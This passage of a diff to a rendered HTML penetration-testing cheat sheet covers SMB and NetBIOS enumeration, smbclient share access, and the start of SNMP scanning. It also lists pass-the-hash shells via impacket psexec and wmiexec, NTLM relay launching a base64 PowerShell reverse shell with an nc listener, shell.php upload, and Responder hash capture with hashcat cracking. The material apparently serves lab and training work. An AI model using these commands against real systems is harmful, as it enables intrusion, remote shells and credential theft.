-</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="c1"># Enumeration scripts</span>
-</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">445</span><span class="w"> </span>--script<span class="o">=</span>smb-enum-shares,smb-enum-users,smb-enum-groups,smb-enum-domains,smb-security-mode<span class="w"> </span>IP
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="c1"># SMB + NetBIOS</span>
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-v<span class="w"> </span>-p<span class="w"> </span><span class="m">139</span>,445<span class="w"> </span>IP
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-v<span class="w"> </span>-p<span class="w"> </span><span class="m">139</span>,445<span class="w"> </span>--script<span class="w"> </span>smb-os-discovery<span class="w"> </span>IP
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="c1"># Enumeration scripts</span>
+</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">445</span><span class="w"> </span>--script<span class="o">=</span>smb-enum-shares,smb-enum-users,smb-enum-groups,smb-enum-domains,smb-security-mode<span class="w"> </span>IP
 </span></code></pre></div>
 <h5 id="nbtscan">nbtscan<a class="headerlink" href="#nbtscan" title="Permanent link">¶</a></h5>
 <p>Query the NetBIOS name service for valid NetBIOS names, specifying the originating UDP port as 137 with the -r option. NetBIOS names are often very descriptive about the role of the host within the organization.</p>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>sudo<span class="w"> </span>nbtscan<span class="w"> </span>-r<span class="w"> </span>IP/24
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>sudo<span class="w"> </span>nbtscan<span class="w"> </span>-r<span class="w"> </span>IP/24
 </span></code></pre></div>
 <h5 id="enum4linux">enum4linux<a class="headerlink" href="#enum4linux" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>enum4linux<span class="w"> </span>-a<span class="w"> </span>IP
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>enum4linux<span class="w"> </span>-a<span class="w"> </span>IP
 </span></code></pre></div>
 <h5 id="smbmap">smbmap<a class="headerlink" href="#smbmap" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="c1"># Enumerate shares</span>
-</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>smbmap<span class="w"> </span>-H<span class="w"> </span>IP
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="c1"># Enumerate shares</span>
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>smbmap<span class="w"> </span>-H<span class="w"> </span>IP
 </span></code></pre></div>
 <h5 id="smbclient">smbclient<a class="headerlink" href="#smbclient" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="c1"># List available SMB shares anonymously</span>
-</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>smbclient<span class="w"> </span>-L<span class="w"> </span><span class="m">10</span>.0.0.5<span class="w"> </span>-N
-</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>
-</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="c1"># List shares with credentials</span>
-</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a>smbclient<span class="w"> </span>-L<span class="w"> </span><span class="m">10</span>.0.0.5<span class="w"> </span>-U<span class="w"> </span>user%password
-</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a>
-</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a><span class="c1"># Connect to a share anonymously</span>
-</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a>smbclient<span class="w"> </span>//10.0.0.5/public<span class="w"> </span>-N
-</span><span id="__span-48-9"><a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a>
-</span><span id="__span-48-10"><a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a><span class="c1"># Connect to a share with credentials</span>
-</span><span id="__span-48-11"><a id="__codelineno-48-11" name="__codelineno-48-11" href="#__codelineno-48-11"></a>smbclient<span class="w"> </span>//10.0.0.5/share<span class="w"> </span>-U<span class="w"> </span>user%password
-</span><span id="__span-48-12"><a id="__codelineno-48-12" name="__codelineno-48-12" href="#__codelineno-48-12"></a>
-</span><span id="__span-48-13"><a id="__codelineno-48-13" name="__codelineno-48-13" href="#__codelineno-48-13"></a><span class="c1"># Connect using a domain-qualified user</span>
-</span><span id="__span-48-14"><a id="__codelineno-48-14" name="__codelineno-48-14" href="#__codelineno-48-14"></a>smbclient<span class="w"> </span>//10.0.0.5/share<span class="w"> </span>-U<span class="w"> </span>DOMAIN<span class="se">\\</span>user%password
-</span><span id="__span-48-15"><a id="__codelineno-48-15" name="__codelineno-48-15" href="#__codelineno-48-15"></a>
-</span><span id="__span-48-16"><a id="__codelineno-48-16" name="__codelineno-48-16" href="#__codelineno-48-16"></a><span class="c1"># Specify SMB version (common in CTFs)</span>
-</span><span id="__span-48-17"><a id="__codelineno-48-17" name="__codelineno-48-17" href="#__codelineno-48-17"></a>smbclient<span class="w"> </span>//10.0.0.5/share<span class="w"> </span>-U<span class="w"> </span>user%password<span class="w"> </span>-m<span class="w"> </span>SMB2
-</span><span id="__span-48-18"><a id="__codelineno-48-18" name="__codelineno-48-18" href="#__codelineno-48-18"></a>
-</span><span id="__span-48-19"><a id="__codelineno-48-19" name="__codelineno-48-19" href="#__codelineno-48-19"></a><span class="c1"># Non-interactive directory listing</span>
-</span><span id="__span-48-20"><a id="__codelineno-48-20" name="__codelineno-48-20" href="#__codelineno-48-20"></a>smbclient<span class="w"> </span>//10.0.0.5/share<span class="w"> </span>-U<span class="w"> </span>user%password<span class="w"> </span>-c<span class="w"> </span><span class="s2">"ls"</span>
-</span><span id="__span-48-21"><a id="__codelineno-48-21" name="__codelineno-48-21" href="#__codelineno-48-21"></a>
-</span><span id="__span-48-22"><a id="__codelineno-48-22" name="__codelineno-48-22" href="#__codelineno-48-22"></a><span class="c1"># Download a single file</span>
-</span><span id="__span-48-23"><a id="__codelineno-48-23" name="__codelineno-48-23" href="#__codelineno-48-23"></a>smbclient<span class="w"> </span>//10.0.0.5/share<span class="w"> </span>-U<span class="w"> </span>user%password<span class="w"> </span>-c<span class="w"> </span><span class="s2">"get flag.txt"</span>
-</span><span id="__span-48-24"><a id="__codelineno-48-24" name="__codelineno-48-24" href="#__codelineno-48-24"></a>
-</span><span id="__span-48-25"><a id="__codelineno-48-25" name="__codelineno-48-25" href="#__codelineno-48-25"></a><span class="c1"># Recursively download all files</span>
-</span><span id="__span-48-26"><a id="__codelineno-48-26" name="__codelineno-48-26" href="#__codelineno-48-26"></a>smbclient<span class="w"> </span>//10.0.0.5/share<span class="w"> </span>-U<span class="w"> </span>user%password<span class="w"> </span>-c<span class="w"> </span><span class="s2">"recurse; prompt off; mget *"</span>
-</span><span id="__span-48-27"><a id="__codelineno-48-27" name="__codelineno-48-27" href="#__codelineno-48-27"></a>
-</span><span id="__span-48-28"><a id="__codelineno-48-28" name="__codelineno-48-28" href="#__codelineno-48-28"></a><span class="c1"># Upload a file</span>
-</span><span id="__span-48-29"><a id="__codelineno-48-29" name="__codelineno-48-29" href="#__codelineno-48-29"></a>smbclient<span class="w"> </span>//10.0.0.5/share<span class="w"> </span>-U<span class="w"> </span>user%password<span class="w"> </span>-c<span class="w"> </span><span class="s2">"put shell.php"</span>
-</span><span id="__span-48-30"><a id="__codelineno-48-30" name="__codelineno-48-30" href="#__codelineno-48-30"></a>
-</span><span id="__span-48-31"><a id="__codelineno-48-31" name="__codelineno-48-31" href="#__codelineno-48-31"></a><span class="c1"># Check write permissions quickly</span>
-</span><span id="__span-48-32"><a id="__codelineno-48-32" name="__codelineno-48-32" href="#__codelineno-48-32"></a>smbclient<span class="w"> </span>//10.0.0.5/share<span class="w"> </span>-U<span class="w"> </span>user%password<span class="w"> </span>-c<span class="w"> </span><span class="s2">"mkdir testdir"</span>
-</span><span id="__span-48-33"><a id="__codelineno-48-33" name="__codelineno-48-33" href="#__codelineno-48-33"></a>
-</span><span id="__span-48-34"><a id="__codelineno-48-34" name="__codelineno-48-34" href="#__codelineno-48-34"></a><span class="c1"># Use a credentials file</span>
-</span><span id="__span-48-35"><a id="__codelineno-48-35" name="__codelineno-48-35" href="#__codelineno-48-35"></a>smbclient<span class="w"> </span>//10.0.0.5/share<span class="w"> </span>-A<span class="w"> </span>creds.txt
-</span><span id="__span-48-36"><a id="__codelineno-48-36" name="__codelineno-48-36" href="#__codelineno-48-36"></a>
-</span><span id="__span-48-37"><a id="__codelineno-48-37" name="__codelineno-48-37" href="#__codelineno-48-37"></a><span class="c1"># Null session check against IPC$</span>
-</span><span id="__span-48-38"><a id="__codelineno-48-38" name="__codelineno-48-38" href="#__codelineno-48-38"></a>smbclient<span class="w"> </span>//10.0.0.5/IPC$<span class="w"> </span>-N
-</span><span id="__span-48-39"><a id="__codelineno-48-39" name="__codelineno-48-39" href="#__codelineno-48-39"></a>
-</span><span id="__span-48-40"><a id="__codelineno-48-40" name="__codelineno-48-40" href="#__codelineno-48-40"></a><span class="c1"># Pass NTLM hash</span>
-</span><span id="__span-48-41"><a id="__codelineno-48-41" name="__codelineno-48-41" href="#__codelineno-48-41"></a>smbclient<span class="w"> </span><span class="se">\\\\</span><span class="m">192</span>.168.50.212<span class="se">\\</span>secrets<span class="w"> </span>-U<span class="w"> </span>USER<span class="w"> </span>--pw-nt-hash<span class="w"> </span>HASH
-</span><span id="__span-48-42"><a id="__codelineno-48-42" name="__codelineno-48-42" href="#__codelineno-48-42"></a>
-</span><span id="__span-48-43"><a id="__codelineno-48-43" name="__codelineno-48-43" href="#__codelineno-48-43"></a><span class="c1"># Download all files in SMB share</span>
-</span><span id="__span-48-44"><a id="__codelineno-48-44" name="__codelineno-48-44" href="#__codelineno-48-44"></a>mask<span class="w"> </span><span class="s2">""</span>
-</span><span id="__span-48-45"><a id="__codelineno-48-45" name="__codelineno-48-45" href="#__codelineno-48-45"></a>recurse<span class="w"> </span>ON
-</span><span id="__span-48-46"><a id="__codelineno-48-46" name="__codelineno-48-46" href="#__codelineno-48-46"></a>prompt<span class="w"> </span>OFF
-</span><span id="__span-48-47"><a id="__codelineno-48-47" name="__codelineno-48-47" href="#__codelineno-48-47"></a>mget<span class="w"> </span>*
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c1"># List available SMB shares anonymously</span>
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>smbclient<span class="w"> </span>-L<span class="w"> </span><span class="m">10</span>.0.0.5<span class="w"> </span>-N
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="c1"># List shares with credentials</span>
+</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a>smbclient<span class="w"> </span>-L<span class="w"> </span><span class="m">10</span>.0.0.5<span class="w"> </span>-U<span class="w"> </span>user%password
+</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a>
+</span><span id="__span-49-7"><a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a><span class="c1"># Connect to a share anonymously</span>
+</span><span id="__span-49-8"><a id="__codelineno-49-8" name="__codelineno-49-8" href="#__codelineno-49-8"></a>smbclient<span class="w"> </span>//10.0.0.5/public<span class="w"> </span>-N
+</span><span id="__span-49-9"><a id="__codelineno-49-9" name="__codelineno-49-9" href="#__codelineno-49-9"></a>
+</span><span id="__span-49-10"><a id="__codelineno-49-10" name="__codelineno-49-10" href="#__codelineno-49-10"></a><span class="c1"># Connect to a share with credentials</span>
+</span><span id="__span-49-11"><a id="__codelineno-49-11" name="__codelineno-49-11" href="#__codelineno-49-11"></a>smbclient<span class="w"> </span>//10.0.0.5/share<span class="w"> </span>-U<span class="w"> </span>user%password
+</span><span id="__span-49-12"><a id="__codelineno-49-12" name="__codelineno-49-12" href="#__codelineno-49-12"></a>
+</span><span id="__span-49-13"><a id="__codelineno-49-13" name="__codelineno-49-13" href="#__codelineno-49-13"></a><span class="c1"># Connect using a domain-qualified user</span>
+</span><span id="__span-49-14"><a id="__codelineno-49-14" name="__codelineno-49-14" href="#__codelineno-49-14"></a>smbclient<span class="w"> </span>//10.0.0.5/share<span class="w"> </span>-U<span class="w"> </span>DOMAIN<span class="se">\\</span>user%password
+</span><span id="__span-49-15"><a id="__codelineno-49-15" name="__codelineno-49-15" href="#__codelineno-49-15"></a>
+</span><span id="__span-49-16"><a id="__codelineno-49-16" name="__codelineno-49-16" href="#__codelineno-49-16"></a><span class="c1"># Specify SMB version (common in CTFs)</span>
+</span><span id="__span-49-17"><a id="__codelineno-49-17" name="__codelineno-49-17" href="#__codelineno-49-17"></a>smbclient<span class="w"> </span>//10.0.0.5/share<span class="w"> </span>-U<span class="w"> </span>user%password<span class="w"> </span>-m<span class="w"> </span>SMB2
+</span><span id="__span-49-18"><a id="__codelineno-49-18" name="__codelineno-49-18" href="#__codelineno-49-18"></a>
+</span><span id="__span-49-19"><a id="__codelineno-49-19" name="__codelineno-49-19" href="#__codelineno-49-19"></a><span class="c1"># Non-interactive directory listing</span>
+</span><span id="__span-49-20"><a id="__codelineno-49-20" name="__codelineno-49-20" href="#__codelineno-49-20"></a>smbclient<span class="w"> </span>//10.0.0.5/share<span class="w"> </span>-U<span class="w"> </span>user%password<span class="w"> </span>-c<span class="w"> </span><span class="s2">"ls"</span>
+</span><span id="__span-49-21"><a id="__codelineno-49-21" name="__codelineno-49-21" href="#__codelineno-49-21"></a>
+</span><span id="__span-49-22"><a id="__codelineno-49-22" name="__codelineno-49-22" href="#__codelineno-49-22"></a><span class="c1"># Download a single file</span>
+</span><span id="__span-49-23"><a id="__codelineno-49-23" name="__codelineno-49-23" href="#__codelineno-49-23"></a>smbclient<span class="w"> </span>//10.0.0.5/share<span class="w"> </span>-U<span class="w"> </span>user%password<span class="w"> </span>-c<span class="w"> </span><span class="s2">"get flag.txt"</span>
+</span><span id="__span-49-24"><a id="__codelineno-49-24" name="__codelineno-49-24" href="#__codelineno-49-24"></a>
+</span><span id="__span-49-25"><a id="__codelineno-49-25" name="__codelineno-49-25" href="#__codelineno-49-25"></a><span class="c1"># Recursively download all files</span>
+</span><span id="__span-49-26"><a id="__codelineno-49-26" name="__codelineno-49-26" href="#__codelineno-49-26"></a>smbclient<span class="w"> </span>//10.0.0.5/share<span class="w"> </span>-U<span class="w"> </span>user%password<span class="w"> </span>-c<span class="w"> </span><span class="s2">"recurse; prompt off; mget *"</span>
+</span><span id="__span-49-27"><a id="__codelineno-49-27" name="__codelineno-49-27" href="#__codelineno-49-27"></a>
+</span><span id="__span-49-28"><a id="__codelineno-49-28" name="__codelineno-49-28" href="#__codelineno-49-28"></a><span class="c1"># Upload a file</span>
+</span><span id="__span-49-29"><a id="__codelineno-49-29" name="__codelineno-49-29" href="#__codelineno-49-29"></a>smbclient<span class="w"> </span>//10.0.0.5/share<span class="w"> </span>-U<span class="w"> </span>user%password<span class="w"> </span>-c<span class="w"> </span><span class="s2">"put shell.php"</span>
+</span><span id="__span-49-30"><a id="__codelineno-49-30" name="__codelineno-49-30" href="#__codelineno-49-30"></a>
+</span><span id="__span-49-31"><a id="__codelineno-49-31" name="__codelineno-49-31" href="#__codelineno-49-31"></a><span class="c1"># Check write permissions quickly</span>
+</span><span id="__span-49-32"><a id="__codelineno-49-32" name="__codelineno-49-32" href="#__codelineno-49-32"></a>smbclient<span class="w"> </span>//10.0.0.5/share<span class="w"> </span>-U<span class="w"> </span>user%password<span class="w"> </span>-c<span class="w"> </span><span class="s2">"mkdir testdir"</span>
+</span><span id="__span-49-33"><a id="__codelineno-49-33" name="__codelineno-49-33" href="#__codelineno-49-33"></a>
+</span><span id="__span-49-34"><a id="__codelineno-49-34" name="__codelineno-49-34" href="#__codelineno-49-34"></a><span class="c1"># Use a credentials file</span>
+</span><span id="__span-49-35"><a id="__codelineno-49-35" name="__codelineno-49-35" href="#__codelineno-49-35"></a>smbclient<span class="w"> </span>//10.0.0.5/share<span class="w"> </span>-A<span class="w"> </span>creds.txt
+</span><span id="__span-49-36"><a id="__codelineno-49-36" name="__codelineno-49-36" href="#__codelineno-49-36"></a>
+</span><span id="__span-49-37"><a id="__codelineno-49-37" name="__codelineno-49-37" href="#__codelineno-49-37"></a><span class="c1"># Null session check against IPC$</span>
+</span><span id="__span-49-38"><a id="__codelineno-49-38" name="__codelineno-49-38" href="#__codelineno-49-38"></a>smbclient<span class="w"> </span>//10.0.0.5/IPC$<span class="w"> </span>-N
+</span><span id="__span-49-39"><a id="__codelineno-49-39" name="__codelineno-49-39" href="#__codelineno-49-39"></a>
+</span><span id="__span-49-40"><a id="__codelineno-49-40" name="__codelineno-49-40" href="#__codelineno-49-40"></a><span class="c1"># Pass NTLM hash</span>
+</span><span id="__span-49-41"><a id="__codelineno-49-41" name="__codelineno-49-41" href="#__codelineno-49-41"></a>smbclient<span class="w"> </span><span class="se">\\\\</span><span class="m">192</span>.168.50.212<span class="se">\\</span>secrets<span class="w"> </span>-U<span class="w"> </span>USER<span class="w"> </span>--pw-nt-hash<span class="w"> </span>HASH
+</span><span id="__span-49-42"><a id="__codelineno-49-42" name="__codelineno-49-42" href="#__codelineno-49-42"></a>
+</span><span id="__span-49-43"><a id="__codelineno-49-43" name="__codelineno-49-43" href="#__codelineno-49-43"></a><span class="c1"># Download all files in SMB share</span>
+</span><span id="__span-49-44"><a id="__codelineno-49-44" name="__codelineno-49-44" href="#__codelineno-49-44"></a>mask<span class="w"> </span><span class="s2">""</span>
+</span><span id="__span-49-45"><a id="__codelineno-49-45" name="__codelineno-49-45" href="#__codelineno-49-45"></a>recurse<span class="w"> </span>ON
+</span><span id="__span-49-46"><a id="__codelineno-49-46" name="__codelineno-49-46" href="#__codelineno-49-46"></a>prompt<span class="w"> </span>OFF
+</span><span id="__span-49-47"><a id="__codelineno-49-47" name="__codelineno-49-47" href="#__codelineno-49-47"></a>mget<span class="w"> </span>*
 </span></code></pre></div>
 <h5 id="impacket">Impacket<a class="headerlink" href="#impacket" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c1"># Obtain interactive shell via SMB share using PsExec by passing hash (system privs) </span>
-</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>impacket-psexec<span class="w"> </span>-hashes<span class="w"> </span><span class="m">00000000000000000000000000000000</span>:HASH<span class="w"> </span>USER@IP
-</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>
-</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="c1"># Obtain interactive shell via SMB share using WmiExec by passing hash (administrator privs)</span>
-</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a>impacket-wmiexec<span class="w"> </span>-hashes<span class="w"> </span><span class="m">00000000000000000000000000000000</span>:HASH<span class="w"> </span>USER@IP
-</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a>
-</span><span id="__span-49-7"><a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a><span class="c1"># Relay Net-NTLMv2 hash (no HTTP server, support SMB2), replace PS base64 content, open listener for reverse shell</span>
-</span><span id="__span-49-8"><a id="__codelineno-49-8" name="__codelineno-49-8" href="#__codelineno-49-8"></a>impacket-ntlmrelayx<span class="w"> </span>--no-http-server<span class="w"> </span>-smb2support<span class="w"> </span>-t<span class="w"> </span>IP<span class="w"> </span>-c<span class="w"> </span><span class="s2">"powershell -enc PS_REVSHELL_ONELINER_BASE64"</span>
-</span><span id="__span-49-9"><a id="__codelineno-49-9" name="__codelineno-49-9" href="#__codelineno-49-9"></a>nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">8080</span>
-</span><span id="__span-49-10"><a id="__codelineno-49-10" name="__codelineno-49-10" href="#__codelineno-49-10"></a><span class="c1"># Open bind shell and run SMB connection to Kali (example)</span>
-</span><span id="__span-49-11"><a id="__codelineno-49-11" name="__codelineno-49-11" href="#__codelineno-49-11"></a>nc<span class="w"> </span>IP<span class="w"> </span>PORT
-</span><span id="__span-49-12"><a id="__codelineno-49-12" name="__codelineno-49-12" href="#__codelineno-49-12"></a>dir<span class="w"> </span><span class="se">\\</span>KALI_IP<span class="se">\t</span>est
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="c1"># Obtain interactive shell via SMB share using PsExec by passing hash (system privs) </span>
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>impacket-psexec<span class="w"> </span>-hashes<span class="w"> </span><span class="m">00000000000000000000000000000000</span>:HASH<span class="w"> </span>USER@IP
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>
+</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="c1"># Obtain interactive shell via SMB share using WmiExec by passing hash (administrator privs)</span>
+</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a>impacket-wmiexec<span class="w"> </span>-hashes<span class="w"> </span><span class="m">00000000000000000000000000000000</span>:HASH<span class="w"> </span>USER@IP
+</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a>
+</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a><span class="c1"># Relay Net-NTLMv2 hash (no HTTP server, support SMB2), replace PS base64 content, open listener for reverse shell</span>
+</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a>impacket-ntlmrelayx<span class="w"> </span>--no-http-server<span class="w"> </span>-smb2support<span class="w"> </span>-t<span class="w"> </span>IP<span class="w"> </span>-c<span class="w"> </span><span class="s2">"powershell -enc PS_REVSHELL_ONELINER_BASE64"</span>
+</span><span id="__span-50-9"><a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a>nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">8080</span>
+</span><span id="__span-50-10"><a id="__codelineno-50-10" name="__codelineno-50-10" href="#__codelineno-50-10"></a><span class="c1"># Open bind shell and run SMB connection to Kali (example)</span>
+</span><span id="__span-50-11"><a id="__codelineno-50-11" name="__codelineno-50-11" href="#__codelineno-50-11"></a>nc<span class="w"> </span>IP<span class="w"> </span>PORT
+</span><span id="__span-50-12"><a id="__codelineno-50-12" name="__codelineno-50-12" href="#__codelineno-50-12"></a>dir<span class="w"> </span><span class="se">\\</span>KALI_IP<span class="se">\t</span>est
 </span></code></pre></div>
 <h5 id="responder">Responder<a class="headerlink" href="#responder" title="Permanent link">¶</a></h5>
 <p><a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="c1"># Receive and crack Net-NTLMv2 hash from target using Responder</span>
-</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="c1"># Display adapters</span>
-</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>ip<span class="w"> </span>a
-</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="c1"># Run Responder on adapter</span>
-</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>tap0
-</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a><span class="c1"># From target machine, run simple dir listing to Responder</span>
-</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a>dir<span class="w"> </span><span class="se">\\</span>IP<span class="se">\t</span>est
-</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a><span class="c1"># Crack captured Net-NTLMv2 hash with hashcat</span>
-</span><span id="__span-50-9"><a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5600</span><span class="w"> </span>paul.hash<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--force
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="c1"># Receive and crack Net-NTLMv2 hash from target using Responder</span>
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a><span class="c1"># Display adapters</span>
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>ip<span class="w"> </span>a
+</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a><span class="c1"># Run Responder on adapter</span>
+</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>tap0
+</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a><span class="c1"># From target machine, run simple dir listing to Responder</span>
+</span><span id="__span-51-7"><a id="__codelineno-51-7" name="__codelineno-51-7" href="#__codelineno-51-7"></a>dir<span class="w"> </span><span class="se">\\</span>IP<span class="se">\t</span>est
+</span><span id="__span-51-8"><a id="__codelineno-51-8" name="__codelineno-51-8" href="#__codelineno-51-8"></a><span class="c1"># Crack captured Net-NTLMv2 hash with hashcat</span>
+</span><span id="__span-51-9"><a id="__codelineno-51-9" name="__codelineno-51-9" href="#__codelineno-51-9"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5600</span><span class="w"> </span>paul.hash<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--force
 </span></code></pre></div>
 <h4 id="snmp-udp-161">SNMP (UDP: 161)<a class="headerlink" href="#snmp-udp-161" title="Permanent link">¶</a></h4>
 <h5 id="nmap_3">Nmap<a class="headerlink" href="#nmap_3" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="c1"># Scan for open ports</span>
-</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span>--open<span class="w"> </span>-p<span class="w"> </span>IP<span class="w"> </span>-oG<span class="w"> </span>open-snmp.txt
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="c1"># Scan for open ports</span>
